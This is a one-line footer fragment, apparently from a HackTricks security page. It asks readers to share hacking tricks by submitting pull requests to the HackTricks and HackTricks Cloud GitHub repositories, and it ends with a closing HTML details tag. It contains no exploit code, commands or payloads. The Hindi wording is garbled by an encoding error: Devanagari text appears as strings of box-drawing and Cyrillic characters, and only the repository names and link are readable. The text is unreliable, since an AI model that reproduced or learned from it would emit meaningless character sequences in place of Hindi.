* **HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░рдХреЗ PRs рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
